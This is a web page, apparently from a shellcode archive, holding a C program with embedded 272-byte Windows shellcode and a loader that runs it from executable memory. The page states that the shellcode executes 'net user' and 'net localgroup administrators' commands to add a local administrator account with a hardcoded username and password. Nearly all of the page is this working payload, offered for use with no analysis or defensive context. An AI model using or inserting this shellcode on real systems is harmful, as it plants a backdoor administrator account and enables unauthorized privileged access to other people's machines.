<html><head><title>Windows - Allwin WinExec add new local administrator + ExitProcess Shellcode - 272 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title: Allwin WinExec add new local administrator + ExitProcess Shellcode - 272 bytes
Date: 2011-05-25
Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)
 -- command: cmd.exe /c net user RubberDuck mudbath /add &amp;&amp; net localgroup administrators RubberDuck /add
 -- Username: RubberDuck
 -- Password: mudbath
*/
 
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
 
int main(){
    unsigned char shellcode[]=
        &quot;\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B&quot;
        &quot;\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9&quot;
        &quot;\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C&quot;
        &quot;\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0&quot;
        &quot;\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B&quot;
        &quot;\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72&quot;
        &quot;\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03&quot;
        &quot;\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47&quot;
        &quot;\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F&quot;
        &quot;\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72&quot;
        &quot;\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66&quot;
        &quot;\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14&quot;
        &quot;\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE&quot;
        &quot;\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53&quot;
        &quot;\xFF\xD2\x6A\x05\xEB\x23\xFF\xD0\x68\x65&quot;
        &quot;\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68&quot;
        &quot;\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54&quot;
        &quot;\xFF\x74\x24\x1C\xFF\x54\x24\x1C\x57\xFF&quot;
        &quot;\xD0\xE8\xD8\xFF\xFF\xFF\x63\x6D\x64\x2E&quot;
        &quot;\x65\x78\x65\x20\x2F\x63\x20\x6E\x65\x74&quot;
        &quot;\x20\x75\x73\x65\x72\x20\x52\x75\x62\x62&quot;
        &quot;\x65\x72\x44\x75\x63\x6B\x20\x6D\x75\x64&quot;
        &quot;\x62\x61\x74\x68\x20\x2F\x61\x64\x64\x20&quot;
        &quot;\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63&quot;
        &quot;\x61\x6C\x67\x72\x6F\x75\x70\x20\x61\x64&quot;
        &quot;\x6D\x74\x6F\x72\x73\x20\x52\x75\x62\x62&quot;
        &quot;\x65\x72\x44\x75\x63\x6B\x20\x2F\x61\x64&quot;
        &quot;\x64\x00&quot;;
    LPVOID lpAlloc;
    void (*pfunc)();
 
    printf(&quot;size = %i bytes\n&quot;, lstrlen(shellcode) + 1);
    printf(&quot;-------------------------\nUsername: RubberDuck\nPassword: mudbath\n&quot;);
    system(&quot;PAUSE&quot;);
 
    lpAlloc = VirtualAlloc(0, 4096,
                           MEM_COMMIT,
                           PAGE_EXECUTE_READWRITE);
 
    if(lpAlloc == NULL){
        printf(&quot;Memory not allocated!\n&quot;);
        return 0;
    }
 
    memcpy(lpAlloc, shellcode, lstrlen(shellcode) + 1);
 
    pfunc = lpAlloc;
 
    pfunc();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
